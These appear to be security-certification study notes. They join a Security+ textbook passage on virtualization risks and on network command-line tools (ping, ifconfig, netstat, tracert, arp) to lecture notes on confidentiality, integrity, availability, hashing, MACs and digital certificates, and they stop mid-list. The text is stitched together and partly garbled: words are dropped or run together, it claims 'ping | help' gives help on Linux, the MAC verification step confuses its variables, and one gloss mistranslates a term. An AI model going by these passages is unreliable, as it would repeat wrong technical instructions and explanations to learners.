Virtual desktops that support non-persistence serve the same desktop for all users. When a user accesses the remote server, it provides a desktop operating system from a preconfigured snapshot. Although users can make changes to the desktop as they’re using it, it reverts to a known state (the original snapshot) when they log off. Another way of viewing this is that it rolls back to a known configuration.
VMs as Files
It’s worth pointing out that virtual machines are simply files. These files certainly have some complexity, but still, they are just files. If you do the labs to create VMs on your computer, you’ll be asked where you want to store these files. If you have a Windows computer, you can use File
Explorer to browse to that location and view the files.
Because the VM is just a group of files, it becomes relatively easy to
move them from one physical server to another. example, if one of your physical servers becomes overloaded, you can move virtual servers off the overloaded system to another physical server. Some virtual server management software makes this as simple as dragging and dropping the virtual servers from one host to another.
It’s also easy to restore a failed virtual server. If you create a backup of the virtual server files and the original server fails, you simply restore the files. You can measure the amount of time it takes to restore a virtual server in minutes. In
contrast, rebuilding a physical server can take hours. Many virtualization products allow you to manage multiple virtual systems on a single server, even when the virtual servers are running on separate physical hosts. example, you might have five physical servers hosting three virtual servers each, and you can manage
all of them through a single management interface. This includes taking snapshots, reverting snapshots, and moving the virtual servers from one physical host to another.
Risks Associated with Virtualization
Despite the strengths of virtualization technologies, you should understand some weaknesses. Many people consider virtual machine escape (VM escape) to be the most serious threat to virtual system security. Loss of confidentiality and loss of availability can also be a concern.
VM Escape
VM escape is an attack that allows an attacker to access the host system from within the virtual system. As previously mentioned, the host system runs an application or process called a hypervisor to manage the virtual systems. In some situations, the attacker can run code on the virtual system and interact with the hypervisor.
Mostvirtualsystemsrunonaphysicalserverwithelevatedprivileges, similartoadministrator privileges. A successful VM escape attack often gives the attacker unlimited control over the host system and each virtual system within the host.
When vendors discover VM escape vulnerabilities, they write and release patches. Just as with any patches, it is important to test and install these patches as soon as possible. This includes keeping both the physical and the virtual servers patched.
VM Sprawl
VM sprawl occurs when an organization has many VMs that aren’t managed properly. Most organizations have specific policies in place to ensure physical servers are kept up to date and personnel only make changes to these servers after going through a change management process. These same policies should also apply to virtual servers.
Consider this scenario. Bart creates a VM running a Microsoft Windows Server version to test a software application. After testing the application, he leaves the VM running. Later, Microsoft releases security patches for the server. The IT department tests these patches and applies them to all of the
known servers that need them. However, because Bart didn’t tell anyone he was creating the VM, it remains unpatched and vulnerable to attack.
Another challenge with VM sprawl is that each VM adds additional load onto a server. If unauthorized VMs are added to physical servers, they can consume system resources. The servers might become slower and potentially crash.
Loss of Confidentiality
As a reminder, each virtual system or virtual machine is just one or more files. Although this makes it easy to manage and move virtual machines, it also makes them easy to steal.
It’s worth pointing out that many VMs include the operating system and data, just as a physical system would have both the operating system and data on its physical drives. example, a virtual machine can include a database with credit card data, company financial records, or any type of proprietary data. Imagine if an administrator became disgruntled. He has access to the systems and as a malicious insider, he can copy the virtual machine, take it home, and launch it on another physical server. At this point, he has access to the system and the data.
Running Kali Linux in a VM
Kali Linux is a free Linux distribution used by many security professionals for penetration testing and security auditing. Additionally, CompTIA listed Kali as one of the recommended software tools. The good news is that you can download Kali Linux for free and install it as a VM using one of the available free virtualization tools.
You can follow the online labs (http://gcgapremium.com/501labs/) to install Kali Linux within a VM. Note that you have some choices:
Hyper-V. If you’re running a version of Windows that supports Hyper-V, you can enable it on Windows and run VMs within it. One benefit of this is that in addition to creating a VM, you can also create a virtual switch.
VMware Workstation Player. If your system doesn’t support Hyper-V, you can run the free version of VMware Workstation Player. A drawback is that the free version of VMware Workstation Player doesn’t support running multiple VMs within a single virtual environment. However, you can upgrade to the paid version of VMware Workstation Pro to gain this and multipleother features. Oracle VMVirtualBox. This has been my favorite in the past. However, when writing this chapter, Kali Linux wouldn’t successfully install in Oracle VM VirtualBox on my Windows system. This might be due to technical issues that Microsoft or Oracle will resolve with updates. Give it a try if you like. It might work perfectly for you.
Once you have Kali Linux installed in a virtual environment, you’ll also be able to run some of the command-line tools mentioned in the CompTIA objectives that only run within Linux.
Using Command-Line Tools
Command-line tools can be invaluable when troubleshooting or analyzing systems. If you know how to use them, they can make many tasks easier. Additionally, the CompTIA Security+ objectives list several command- line tools that you should know to help you assess the security posture of an organization.
 Some are specific to Windows systems and run through the Windows Command Prompt window. Others are specific to Linux systems
and run through the Linux terminal (sometimes called the shell).
As you read through this section and learn about these tools, I strongly encourage you to run the commands. You will also find some basic commands
that you can run through in the online labs at http://gcgapremium.com/501labs/. A challenge many test takers have is that they don’t have a Linux system to play around with these commands. If you can’t enter them and see what they do, you might have trouble with even the easy questions. The online labs include labs you can use to create a virtual Linux environment on a Windows
system.
Windows Command Line
Before you can use the command line in Windows, you first need to launch the Windows Command Prompt window. The simplest way to launch the Command Prompt window is to right- click the Start button and select Command Prompt, as shown in Figure 1.3. The Start button is at the lower left of your screen and clicking it displays the Start menu with links to many commonly used applications.
Figure 1.3: Launching the Windows Command Prompt window
 In some situations, you need to start the Command Prompt window with elevated permissions as an administrator. To do this, right-click the Start button and select Command Prompt (Admin).
If you’re using a different version of Windows (or Microsoft decides to modify the function of the Start button again), a quick search with your favorite search engine should help you identify how to open the Command Prompt window.
Linux Terminal
The terminal is where you run commands in a Linux system. There are different ways to access the terminal depending on the distribution you’re using. If you’re running Kali Linux (recommended while using this book), you can start it by simply clicking the terminal icon on the Kali menu.  Figure 1.4 shows an instance of Kali with the menu on the left. If you hover over the second icon, you’ll see
“Terminal” appear. Click it and it starts the terminal.
Figure 1.4: Launching the terminal in Kali Linux
For simplicity, instead of stating “Linux or Unix” throughout this book, I’m just stating it as Linux. Note that Linux is a version of Unix and commands that can be run in a Unix terminal can also be run in a Linux terminal.
Understanding Switches and Getting Help
Almost every command you’ll run across has options available that you can invoke with a switch. A Windows command-line switch uses a forward slash (/) or a dash (-) after the command and includes an option that modifies the command to perform a different function.
Linux commands use switches too, but they typically only use a dash. If you use a forward slash, you will typically get unexpected results or an error.
The most used switch in Windows systems is the help switch identified with a question mark. example, you can use the help switch to get help using these commands: ping /? or ping -? ipconfig /? or ipconfig -? netstat /? or netstat-?
Although Linux terminal commands use switches too, they don’t use the question mark for help. Instead, if you want basic help on a command, you can often just type the command without any switch, or use the pipe symbol (|) and the word help:
ping
ping | help
Most Linux distributions include a built-in user manual that you can query. The manual is organized by man pages and you query them with the man command. example, you can use the following command to get help on ping:
man ping
Unfortunately, there isn’t a consistent standard to get help for all
commands in Linux. Sometimes, one method works, but another one doesn’t. The key is to know the different methods so that you can use an alternate method if necessary.
Understanding Case
Most Windows commands are not case sensitive. In other words, you can type in a command using uppercase characters, lowercase characters, or any combination. example, each of the following commands will ping the localhost IPv6 address (::1) and provide the same output:
ping -6 localhost PiNg -6 localHOST PING -6 LocalHost
However, this is not true in the Linux terminal. Instead, commands are typically lowercase and if you use uppercase letters, you’ll find that the command is not recognized. Of the three commands shown for the Windows command line, only ping -6 localhost will work within the Linux terminal.
As you go through these commands, note that many of them support both IPv4 addresses and IPv6 addresses. By querying help, you can see how to do each.
Ping
Ping is a basic command used to test connectivity for remote systems.
You can also use it to verify a system can resolve valid host names to IP addresses, test the NIC, and check the security
posture of a network.
The ping command checks connectivity by sending Internet Control
Message Protocol (ICMP) echo request packets. Remote systems answer with ICMP echo reply packets and if you receive echo replies, you know that the remote system is operational. As a simple example, the following command verifies that your computer can connect with another computer on your network:
ping 192.168.1.1
On Windows systems, ping sends out four ICMP echo requests. Systems that receive the ICMP echo requests respond with ICMP echo replies. On Linux-based systems, ping continues until you press the Ctrl + C keys to stop it. You can mimic this behavior on Windows systems by using the -t switch like this:
ping -t 192.168.1.1
Similarly, you can mimic the behavior of a Windows ping on a Linux system using the -c switch (for count) like this:
ping -c 4 192.168.1.1
This example tested connectivity with an IP address in a local network, but you can just as easily test connectivity with any system. example, if you knew the IP address of a system hosting a web site on the Internet, you could ping its IP address.

---

## Using Ping to Check Name Resolution

- The **name resolution process** resolves a host name (getcertifiedgetahead.com) to an IP address.
- There are several elements of name resolution.
- Typically, a computer will query a Domain Name System (DNS) with the host name and DNS will respond with an IP address.
- Some malware attempts to break the **name resolution process** for specific hosts.
- example,
  - Windows systems get updates from a **Windows Update server**.
  - malware changes the **name resolution process** to prevent systems from reaching the Windows Update server and getting updates.


can ping the host name of a remote system and verify that name resolution is working.

```bash
ping getcertifiedgetahead.com
# Here’s the result when the command is executed at the command prompt on a Windows 10 system.
# Notice that the first line shows that ping resolved the host name (getcertifiedgetahead.com) to its IP address (72.52.206.134):
# Pinging getcertifiedgetahead.com [72.52.206.134] with 32 bytes of data:
Reply from 72.52.206.134: bytes=32 time=45ms TTL=116
Reply from 72.52.206.134: bytes=32 time=45ms TTL=116
Reply from 72.52.206.134: bytes=32 time=48ms TTL=116
Reply from 72.52.206.134: bytes=32 time=45ms TTL=116
Ping statistics for 72.52.206.134:
Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds: Minimum = 45ms,
Maximum = 48ms, Average = 45ms
```



Beware of Firewalls
If you receive replies from a system, it verifies the other system is operational and reachable. However, if the ping command fails, it doesn’t necessarily mean that the remote system is operational or not reachable. Ping might show a “Reply Timed Out” error even if the remote system is functioning properly.
Many denial-of-service (DoS) attacks use ICMP to disrupt services on Internet-based systems. To protect systems, firewalls commonly block ICMP traffic to prevent these attacks from succeeding. In other words, a remote system might be operational, but a ping will fail because the firewall is blocking ICMP traffic.
example, you might be able to connect to the http:// blogs.getcertifiedgetahead.com web site using a web browser, but ping might fail. This indicates that the web site is operational with Hypertext Transfer Protocol (HTTP), but a firewall is blocking ICMP traffic.
Using Ping to Check Security Posture
You can also use ping to check the security posture of a network. example, if you’ve configured firewalls and routers to block ping traffic, you can
   verify the firewalls and routers are blocking the traffic by using ping to check it.
Chapter 4 covers intrusion prevention systems (IPSs) in more depth, but as an introduction, they can often detect attacks and block them automatically. example, a simple distributed denial-of-service (DDoS) attack can send thousands of pings to a server and overload it. An IPS can detect the attack and automatically block ICMP traffic, effectively preventing any impact from the attack.
You can use ping to simulate an attack from a couple of computers to repeatedly send ping requests. If the IPS is working, it will block these attacks and the
pings will stop receiving replies.
Ipconfig, ifconfig, and ip
The ipconfig command (short for Internet Protocol configuration) shows the Transmission Control Protocol/Internet Protocol (TCP/IP) configuration information for a system. This includes items such as the computer’s IP address, subnet mask, default gateway, MAC address, and the address of a Domain Name System (DNS) server. The command shows the configuration information for all network interface cards (NICs) on a system, including both wired and wireless NICs. Technicians often use ipconfig as a first step when troubleshooting network problems.
Linux-based systems use ifconfig (short for interface configuration) instead of ipconfig. A benefit is that ifconfig has more capabilities than ipconfig, allowing you to use it to configure the NIC in addition to listing the properties of theNIC.
The following list shows some common commands:
ipconfig. Entered by itself, the command provides basic information about the NIC, such as the IP address, subnet mask, and default gateway.
 ipconfig /all. This command shows a comprehensive listing of TCP/IP configuration information for each NIC. It includes the media access control (MAC) address, the address of assigned DNS servers, and the address of a Dynamic Host Configuration Protocol (DHCP) server if the system is a DHCP client. You can use ifconfig -a on Linux systems.
ipconfig /displaydns. Each time a system queries DNS to resolve a host name to an IP address, it stores the result in the DNS cache and this command shows the contents of the DNS cache. It also shows any host name to IP address mappings included in the hosts file.
ipconfig /flushdns. You can erase the contents of the DNS cache with this command. Use this when the cache has incorrect information and you want to ensure that DNS is queried for up-to-date information.
The following commands are unique to Linux systems:
ifconfig eth0. This command shows the configuration of the first Ethernet interface (NIC) on a Linux system. If the system has multiple NICs, you can use eth1, eth2, and so on. You can also use wlan0 to view information on the first wireless interface.
ifconfig eth0 promisc. This command enables promiscuous mode on the first Ethernet interface. Promiscuous mode allows a NIC to process all traffic it receives. Normally, a NIC is in non-promiscuous mode and it ignores all packets not addressed to it. You can disable promiscuous mode with this command: ifconfig eth0 -promisc.
ifconfig eth0 allmulti. This command enables multicast mode on the NIC. This allows the NIC to process all multicast traffic received by the NIC. Normally, a NIC will only process multicast traffic for multicast groups that it has joined. You can disable multicast mode with this command: ifconfig eth0 -allmulti.
Normally, a NIC uses non-promiscuous mode and only processes packets addressed directly to its IP address. However, when you put it in promiscuous mode, it processes all packets regardless of the IP address. This allows the protocol analyzer to capture all packets that reach the NIC.
The ifconfig command was deprecated in 2009 in Debian distributions of Linux. Deprecated means that its use is discouraged but tolerated. The
ifconfig command is part of the net-tools package and Linux Debian developers are no longer maintaining that package. However, you’ll still see ifconfig and other tools in the net-tools package on most Linux systems, including Kali Linux. instead. Although the ip command can display information and configure network interfaces, it doesn’t use the same commands or have the same abilities. example, it doesn’t have a command you can use to enable promiscuous mode on a NIC. Here are a few commands that you can use with ip:
ip link show. Shows the interfaces along with some details on them ip link set eth0 up. Enables a network interface
ip -s link. Shows statistics on the network interfaces
 Netstat
The netstat command (short for network statistics) allows you to view statistics for TCP/IP protocols on a system. It also gives you the ability to view active TCP/IP network connections. Many attacks establish connections from an infected computer to a remote computer. If you suspect this, you can often identify these connections with netstat.
Some of the common commands you can use with netstat are:
Netstat. Displays a listing of all open TCP connections.
Netstat -a. Displays a listing of all TCP and User Datagram Protocol (UDP) ports that a system is listening on, in addition to all open connections. This listing includes the IP address followed by a colon and the port number, and you can use the port number to identify protocols. example, if you see an IP address followed by :80, it indicates the system is listening on the default port of 80 for HTTP. This
indicates this system is likely a web server.
Netstat –r. Displays the routing table.
Netstat -e. Displays details on network statistics, including how many bytes the system sent and received.
Netstat -s. Displays statistics of packets sent or received for specific protocols, such as IP, ICMP, TCP, andUDP.
Netstat -n. Displays addresses and port numbers in numerical order. This can be useful if you’re looking for information related to a specific IP address or a specific port.
Netstat -p protocol. Shows statistics on a specific protocol, such as TCP or UDP. example, you could use netstat -p tcp to show only TCP statistics.
You can combine many of the netstat switches to show different types of information. example, if you want to show a listing of ports that the system is listening on (-a), listed in numerical order (-n), for only the TCP protocol (-p tcp), you could use this command:
netstat -anp tcp
Netstat displays the state of a connection, such as ESTABLISHED to indicate an active connection. RFC 793 (https://tools.ietf.org/rfc/rfc793.txt) formally defines these states. Some of the common states are:
ESTABLISHED. This is the normal state for the data transfer phase of a connection. It indicates an active open connection.
LISTEN. This indicates the system is waiting for a connection request. The well- known port a system is listening on indicates the protocol.
CLOSE_WAIT. This indicates the system is waiting for a connection termination request.
TIME_WAIT. This indicates the system is waiting for enough time to pass to be sure the remote system received a TCP-based acknowledgment of the connection. SYN_SENT. This indicates the system sent a TCP SYN (synchronize) packet as the first part of the SYN, SYN-ACK (synchronize-acknowledge), ACK (acknowledge) handshake process and it is waiting for the SYN-ACK response. SYN_RECEIVED. This indicates the system sent a TCP SYN- ACK packet after receiving a SYN packet as the first part of the SYN, SYN-ACK, ACK handshake process. It is waiting for the ACK response to establish the connection. An excessive number of SYN_RECEIVED states indicate a SYN attack where an attacker is flooding a system with SYN packets but never finalizes the connection with ACK packets.
Tracert
The tracert command lists the routers between two systems. In this context, each router is referred to as a hop. Tracert identifies the IP address and sometimes the host name of each hop in addition to the round-trip times (RTTs) for each hop. Windows-based systems use tracert and Linux-based systems use traceroute, but they both function similarly. For simplicity, I’m using the command name tracert in this section, but this section applies to both equally.
Network administrators typically use tracert to identify faulty routers on the network. Ping tells them if they can reach a distant server. If the ping fails, they can use tracert to identify where the traffic stops. Some of the hops will succeed, but at some point, tracert will identify where packets are lost, giving them insight into where the problem has occurred. Other times, they will see where the RTTs increase as traffic is routed around a faulty router. Tracing a path is especially valuable when troubleshooting issues through a wide area network (WAN).
From a security perspective, you can use tracert to identify modified paths. example, consider Figure 1.5. Users within the internal network normally access the Internet directly through Router 1. However, what if an attacker installed an unauthorized router between Router 1 and the Internet?
Figure 1.5: Tracing a path with tracert
Traffic will still go back and forth to the users. However, the attacker could capture the traffic with a protocol analyzer and view any data sent in cleartext. The attacker may also launch other attacks, such as some of the attacks discussed in Chapter 7.
From another perspective, you can identify if Internet paths have been modified. Imagine that you often connect to a server in New York from a
New York location. Today, the connection seems abnormally slow. You could use tracert to verify the path. If you notice that traffic is now going through IP addresses in foreign countries, it indicates a problem.
Give it a try. Launch a command prompt and use the following commands to see some common uses and outputs from the tracert command:
Type in tracert blogs.getcertifiedgetahead.com and press Enter. Identify how many hops are between your system and this web server. Identify if any RTTs are
 significantly longer than others.
Type in tracert –d blogs.getcertifiedgetahead.com and press Enter. Notice that the -d switch forces tracert to not resolve IP addresses to host names, allowing the command to finish more quickly.
Arp
Arp is a command-line tool that is related to the Address Resolution Protocol (ARP); however, arp (the command) and ARP (the protocol) are not the same thing. Chapter 3 discusses ARP (the protocol), but as a short introduction, ARP resolves IP addresses to MAC addresses and stores the result in the ARP cache.
You can use the arp command to view and manipulate the ARP cache. Here are some sample commands:
arp. Without a switch, shows help on Windows
arp. Without a switch, shows the ARP cache on Linux
arp -a. Shows the ARP cache onWindows
arp -a 192.168.1.1. Displays the ARP cache entry for the specified IP address
You can also use arp to identify the MAC address of other systems on your local network. example, imagine you want to identify the MAC address of server1. You can ping server1 and ARP will identify server1’s IP address. You can then use arp -a to show the ARP cache, which includes the MAC address for server1.
Chapter 7 covers several attacks, including ARP cache poisoning where attackers manipulate the ARP cache. If you suspect an ARP cache poisoning attack, you can use arp to check the cache.
Foundation Topics
Security Fundamentals
- this section identifies several categories of network attacks.
Network Security Goals
- Today’s corporate networks, the demands of ecommerce and customer contact require connectivity between internal corporate networks and the outside world.
- Two basic assumptions about modern corporate networks:
◦ Today’s corporate networks are large, interconnect with other networks, and run both standards-based and proprietary
protocols.
◦ The devices and applications connecting to and using corporate
networks are continually increasing in complexity.
- Computers and networks are being misused at a growing rate.
- Spam, phishing, and computer viruses are becoming multibillion-
dollar problems, as is identity theft, which poses a serious threat to the personal finances and credit ratings of users, and creates liabilities for corporations.
- Thus, there is a growing need for broader knowledge of computer security in society as well as increased expertise among information technology professionals. Society needs more security- educated computer professionals, who can successfully defend against and prevent computer attacks, as well as security-educated computer users, who can safely manage their own information and the systems they use.
- computer security's concepts and terms. 3 primary goals of network security:
◦ Confidentiality
◦ Integrity
◦ Availability
Confidentiality 机密性
Data confidentiality: keeping data private, avoidance of the unauthorized disclosure of information. offers a high level of assurance that data, objects, or resources are restricted from unauthorized subjects.
(entail physically or logically restricting access to sensitive data or encrypting traffic traversing a network)
the heart of information security
Events that lead to confidentiality breaches include:
failing to properly encrypt a transmission,
failing to fully authenticate a remote system before transferring data, leaving open otherwise secured access points,
accessing malicious code that opens a back door,
misrouted faxes,
documents left on printers, or even walking away from an access terminal while data is displayed on the monitor.
Tools for protecting sensitive information:
Encryption:
  - Encrypt traffic, package using encryption/decryption key
  - extremely difficult to determine the original information without the decryption key.
  - encryption/decryption algorithms uses a key in its mathematical calculation,
network-security mechanisms (like firewalls, access control lists [ACL])
  - prevent unauthorized access to network resources.
Authentication: 鉴定
  - identity or role that someone has.
  - Require appropriate credentials (like usernames and
passwords):
  - something the person has (smart card/radio key fob
storing secret keys),
  - something the person knows (password),
  - something the person is (fingerprint).
Authorization: 授权
  - Determine if a person or system is allowed access to
resources, based on an access control policy.
  - rules and policies that limit access to confidential information
to those people and/or systems with a “need to know.”
  - may be determined by identity (like name or serial number, or
by a role that a person has)
  - prevent attacker from tricking the system to have access to
protected resources.
Physical security, personnel training:
  - the establishment of physical barriers to limit access to
protected computational resources.
  - locks on cabinets and doors, windowless rooms, sound
dampening materials,
  - rooms with walls incorporating copper meshes (Faraday cages)
so that electromagnetic signals cannot enter or exit the enclosure. Example:
little lock icon in website:
browser perform an authentication procedure to verify the web site is
indeed who it says it is.
the web site check that our browser is authentic and we have the
appropriate authorizations to access this web page according to its
access control policy.
Our browser then asks the web site for an encryption key to encrypt our
credit card information in encrypted form.
Finally, our credit card number reaches the server that is providing this
web site, the data center where the server is located should have appropriate levels of physical security, access policies, and authorization and authentication mechanisms to keep our credit card number safe.
There are a number of real demonstrated risks to physical eavesdropping.
Confidentiality and integrity depend on each other. Without object integrity, confidentiality cannot be maintained. Other concepts, conditions, and aspects of confidentiality include the following:
Sensitivity: the quality of information could cause harm or damage if disclosed. Maintaining confidentiality of sensitive information helps to prevent harm or damage.
Discretion 慎重: an act of decision where an operator can influence or control disclosure in order to minimize harm or damage.
Criticality 危险程度: The higher criticality, the more likely the need to maintain the confidentiality of the information. High levels of criticality are essential to the operation or function of an organization.
Concealment: the act of hiding or preventing disclosure. Often concealment is viewed as a means of cover, obfuscation, or distraction.
Secrecy: the act of keeping something a secret or preventing the disclosure of information.
Privacy: keeping information confidential that is personally identifiable or that might cause harm, embarrassment, or disgrace to someone if revealed. location can also provide strict access controls. Seclusion can help
enforcement confidentiality protections.
Isolation: keeping something separated from others. Isolation can be
used to prevent commingling of information or disclosure of
information.
Each organization needs to evaluate the nuances of confidentiality they
wish to enforce. Tools and technology that implements one form of confidentiality might not support or allow other forms.
Integrity 诚实
the property that information has not be altered/modified in an unauthorized way. objects must retain their veracity and be intentionally modified by only authorized subjects.
A lot of ways that data integrity can be compromised in computer systems and networks (benign / malicious)
benign compromise:
  - Example: a storage device being hit with a stray cosmic ray that flips a bit in an important file, or a disk drive might simply crash, completely destroying some of its files.
malicious compromise:
  - Example: a computer virus that infects our system and deliberately changes some the files of our operating system, so that our computer then works to replicate the virus and send it to other computers.
Examples of integrity violations:
  - Modifying the appearance of a corporate website
  - Intercepting and altering an e-commerce transaction
  - Modifying financial records that are stored electronically
Integrity can be examined from 3 perspectives:
Preventing unauthorized subjects from making modifications
Preventing authorized subjects from making unauthorized modifications, such as mistakes
Maintaining the internal and external consistency of objects so that their data is a correct and true reflection of the real world and any relationship with any child, peer, or parent object is valid, consistent, and verifiable
Numerous attacks focus on the violation of integrity, include: viruses,
logic bombs,
unauthorized access,
errors in coding and applications, malicious modification, intentional replacement,
and system back doors.
not limited to intentional attacks. Human error, oversight, or ineptitude accounts for many instances of unauthorized alteration of sensitive information.
There are several tools specifically for support integrity:
Backups: the periodic archiving 存档 of data. Checksums:
  - A checksum function depends on the entire contents of a file,
the computation 计算 of a function that maps the contents of a
file to a numerical value.
  - Even a small change to the input file (such as flipping a single bit) will result in a different output value.
  - Checksums are like trip-wires, they are used to detect when a breach to data integrity has occurred.
Data correcting codes:
  - methods for storing data in such a way that small changes can be easily detected and automatically corrected.
  - These codes are typically applied to small units of storage (e.g., at the byte level or memory word level), but there are also data- correcting codes that can be applied to entire files as well.
These tools for achieving data integrity all possess a common trait—they use redundancy.
  - they involve the replication 复制 of some information content or functions of the data
  - so that we can detect and sometimes even correct breaches in data integrity.
not just the content of data file, also need to protect the metadata 元数据 for data file (attributes of the file or information about access to the file, not strictly a part of its content)
Examples of metadata:
▸ the user who is the owner of the file,
▸ the last user who has modified the file,
▸ the last user who has read the file,
▸ the dates and times when the file was created and last modified and
accessed,
▸ the name and location of the file in the file system,
▸ the list of users or groups who can read or write the file.
Thus, changing any metadata of a file should be considered a violation of its integrity.
Example:
  - intruder might not modify 修改 the content of files in a system he has infiltrated,
  - but nevertheless 仍然 be modifying metadata
  - Like access time stamps, by looking at our files (and thereby compromising their confidentiality if they are not encrypted).
  - So system has integrity checks for metadata, may be able to detect an intrusion that would have otherwise gone unnoticed.
3.4 Cryptographic Hash Functions
- To reduce the size of message that user has to sign, often use cryptographic hash functions (checksums)
- the function is one-way, easy to compute but hard to invert.
- Applications to Digital Signatures
◦ compute signature: ▸ S = ESB (h(M))
◦ verify signature S on a message M. ▸ DPB (S) = h(M).
◦ collision resistant:
▸ given M, it is difficult to find a different message, M′, such that
h(M) = h(M′)
- File System Integrity
◦ Hashing: one approach to providing integrity to data transmissions crossing a network.
▸ hashing takes a string of data (like a password) and runs it through an algorithm. ▸ The result of the algorithm is called a hash (digest).
▸ a hashing algorithm produces hash digests of the same length
regardless of the size of the data being hashed. ◦ example:
◦ Sender runs a hashing algorithm on the data and sends the hash digest along with the data.
◦ when the recipient receives the data, she can run the data through the same hashing algorithm.
◦ If the recipient calculates the same hash digest, the data has not been modified in transit (she has confirmed the integrity of the data).
- Message Authentication Codes
◦ hash function h, a secret key k shared by two parties, message M
◦ One computes the hash value of the key K concatenated with
message M:
▸ A = h(K ||M).
▸ A = message authentication code (MAC)
◦ Alice then sends the pair (M, A) to Bob
◦ Since the communication channel is insecure, we denote with (N,
B) the pair received by Bob. ▸ Bob: C = h(K ||N).
◦ If MAC C = MAC B, then Bob is assured that M′ is the message sent by Alice MAC B = MAC A.
- Two of the most common hashing algorithms
◦ Message Digest 5 (MD5): Creates 128-bit hash digests
◦ Secure Hash Algorithm 1 (SHA-1): Creates 160-bit hash digests
- Hashing by itself, however, does not guarantee data integrity, because an attacker could intercept a string of data, manipulate it, and recalculate the hash value based on the manipulated data. The victim would then determine that the hash was valid based on the data.
- To overcome this limitation of pure hashing, hash-based message authentication code (HMAC) uses an additional secret key in the calculation of a hash value. So, an attacker would not be able to create a valid hash value, because he would not know the secret key.
◦ Challenge-Response Authentication Mechanism Message Digest 5 (CRAM-MD5) is a common variant of HMAC frequently used in e-mail systems.
3.5 Digital Certificates
- How does Alice know that the public key, PB, is really the public key for Bob?
- a trusted authority who is good at determining the true identities of people,
- that authority can digitally sign a statement that combines each person’s identity with their public key.
- That is, sign a statement like the following:
◦ “The Bob who lives on 11 Main Street in Gotham City was born on
August 4, 1981, and has email address bob@gotham.com, has the public key PB, and I stand by this certification until December 31, 2011.”
- Such a statement is called a digital certificate so long as it combines a public key with identifying information about the subject who has that public key.
- The trusted authority who issues such a certificate is called a
Certificate Authority (CA).
◦ Certificate Authority (CA): certificate issuing company: Digicert,
Symantec, Verisign, Visa
◦ Now, rather than simply trusting on blind faith that PB is the public key for the Bob
◦ Alice needs only to trust the certificate authority.
◦ Alice needs public key for the CA, she will use that to verify the
CA’s signature on the digital certificate for Bob.
- In practice, the public keys of commonly accepted CAs come with the
operating system. - Since the digital certificate is strong evidence of the authenticity of Bob’s public key, Alice can trust it even if it comes from an unsigned email message or is posted on a third-party web site.
◦ Example:
◦ the digital certificate for a web site typically includes:
▸ Name of the certification authority (e.g., Thawte). ▸ Date of issuance of the certificate (e.g., 1/1/2009). ▸ Expiration date of the certificate (e.g., 12/31/2011). ▸ Address of the website (e.g., mail.google.com).
▸ Name of the organization operating the website(e.g., “Google,Inc.”).
▸ Public key used of the web server (e.g., an RSA 1, 024-bit key). ▸ Name of the cryptographic hash function used (e.g.,
SHA-256).
▸ Digital signature.
◦ when an Internet browser “locks the lock” at a secure web site,
▸ it is doing so based on a key exchange
▸ starts with the browser downloading the digital certificate for
this web server, matching its name to a public key.
▸ Thus, one approach to defend against a phishing is to check
the digital certificate, contains the name of the organization
associated with the website.
- There are a number of other cryptographic concepts:
◦ a zero-knowledge proofs,
◦ secret sharing schemes,
◦ and broadcast encryption methods,
◦ but the topics covered above are the most common cryptographic
concepts used in computer security applications.
- Each company's unit thumbprint.
- The certificate downloaded:
- Certification path: root-intermedio-host(p7b). Certificate chain.
- To secure my web server.
◦ Have a web server.
◦ Add roles to server to make it a web server.
◦ create a CSR.
- Quest Certificate:
◦ Login in those CA company
◦ request a CSR (Certificate signing request) from certificate admin
◦ Get reply back from the CA company. [cer.p7b] ▸ [cer.p7b]: has 2 certificates: 1 for global root, 1 for host. Availability
a measure of the data’s accessibility. the property that information is accessible and modifiable in a timely fashion by those authorized to do so.
availability of 99.999% (five nines of availability): down only 5 minutes per year,
Availability includes efficient uninterrupted access to objects and prevention of denial-of-service (DoS) attacks.
There are numerous threats to availabilit, include:
device failure,
software errors,
environmental issues (heat, static, flooding, power loss, and so on). some forms of attacks that focus on the violation of availability:
  - denial of service (DoS) attack:
  - Send improperly formatted data to a networked device,
  - resulting in an unhandled exception error.
  - Flood a network system with an excessive amount of
traffic or requests,
  - consume a system’s processing resources
  - prevent the system from responding to many legitimate
requests.
  - object destruction,
  - communication interruptions.
a number of tools for providing availability:
Physical protections:
  - infrastructure meant to keep information available even in the event of physical challenges.
  - Like buildings housing critical computer systems withstand storms, earthquakes, and bomb blasts, outfitted with generators and other electronic equipment to be able to cope with power outages and surges. Computational redundancies:
  - computers and storage devices that serve as fallbacks in the case of failures.
  - Example:
  - redundant arrays of inexpensive disks (RAID) use storage
redundancies to keep data available to their clients.
  - Also, web servers are often organized in multiples called
“farms”
  - so that the failure of any single computer can be dealt with
without degrading the availability of the web site.
Numerous countermeasures can ensure availability against possible threats, include:
designing intermediary delivery systems properly, using access controls effectively,
monitoring performance and network traffic, using firewalls and routers to prevent DoS attacks, implementing redundancy for critical systems, maintaining and testing backup systems.
Most security policies, as well as business continuity planning (BCP), focus on the use of fault tolerance features at the various levels of access/ storage/security (that is, disk, server, or site) with the goal of eliminating single points of failure to maintain availability of critical systems.
Assurance, Authenticity, and Anonymity - In addition to the classic C.I.A. there are a number of additional concepts A.A.A., which in this context refers to assurance, authenticity, and anonymity.
- Anonymity 匿名者
- When people interact with systems in ways that involve their real- world identities
◦ a number of positive benefits, as out-lined above.
◦ an unfortunate side effect from using personal identities in such electronic transactions
◦ however. We end up spreading our identity across a host of digital records, which ties our identity to our medical/purchase history, legal records, email communications, employment records, etc.
- anonymity: the property that certain records or transactions not to be attributable to any individual.
- If organizations need to publish data about their members or clients, they should do in a privacy-preserving fashion, using some of the following tools:
◦ Aggregation:
▸ the combining of data from many individuals disclosed sums or averages cannot be tied to any individual.
▸ Example:
- the U.S. Census routinely publishes population breakdowns of zip- code regions by ethnicity, salary, age, etc.,
- but it only does so when such disclosures would not expose details about any individual.
◦ Mixing:
▸ the intertwining 缠结 of transactions, information, or communications in a way that cannot be traced to any individual.
▸ This technique is somewhat technical, involves systems that can mix data together in a quasi-random way so that transactions or searches can still be performed, but without the release of any individual identity.
◦ Proxies: 代理权
▸ trusted agents that engage in actions for an individual in a way that cannot be traced back to that person.
▸ Example:
- Internet searching proxies, web sites that provide an Internet browser interface, so individuals can visit web sites that they might be blocked from because of there's location. ◦ Pseudonyms: 假名
▸ fictional identities that can fill in for real identities in communications and transactions, but are known only to a trusted entity.
▸ Example:
